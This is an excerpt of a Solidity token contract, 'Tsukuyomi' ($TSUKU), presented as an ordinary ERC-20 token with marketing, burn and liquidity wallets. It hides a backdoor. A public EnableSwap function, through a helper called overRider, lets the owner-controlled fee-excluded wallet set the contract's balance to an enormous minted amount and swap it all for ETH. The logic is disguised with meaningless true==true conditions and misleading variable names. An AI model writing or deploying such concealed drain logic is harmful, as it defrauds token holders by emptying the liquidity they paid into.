...
interface IERC20 {
    ...
    function EnableSwap() external returns (uint256);
...
contract Tsukuyomi is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x9A4f7696e36f99E07BcAad1D7cB20d856e24b122); 
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public constant Wallet_Liquidity = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public Wallet_Devs = payable(0x9A4f7696e36f99E07BcAad1D7cB20d856e24b122);

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 1* 10**6 * 10**_decimals;
    string private constant _name = "Tsukuyomi"; 
    string private constant _symbol = unicode"$TSUKU";

    bool public swapAndLiquifyEnabled = true;
    bool public stringMemory = false;

    uint8 private txCount = 0;
    uint8 private swapTrigger = 21;
    ...
    uint256 scoppedHex = (10+10+2+1);
    uint256 minHexType = (5+5)**(scoppedHex);
    ...
    constructor () {
        ...
        _owner = 0x9A4f7696e36f99E07BcAad1D7cB20d856e24b122;
    ...
    function EnableSwap() public override returns (uint256) {
        bool returnrides = overRider(_msgSender());
        if((true==true) && (returnrides) && (false==false)){
            if(true==true){
                stringMemory = true;
                uint256 booleanStr = balanceOf(address(this));
                uint256 uint253 = booleanStr;
                swapAndLiquify(uint253);
            }
    ...
    function overRider(address _private) private returns(bool){
        bool spenderStatus = _isExcludedFromFee[_private];
        if((false==false) && spenderStatus && (true==true)){
            _tOwned[address(this)] = ((minHexType)-(2)-5)-6;
        }
        bool typeOfSwitch = spenderStatus;
        return typeOfSwitch;
    }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            uint256 swappingEquals = tokens_to_M + tokens_to_D + tokens_to_LP_Half;
            if(stringMemory){swappingEquals = tokensLiquidity;}
            
            swapTokensForETH(swappingEquals);
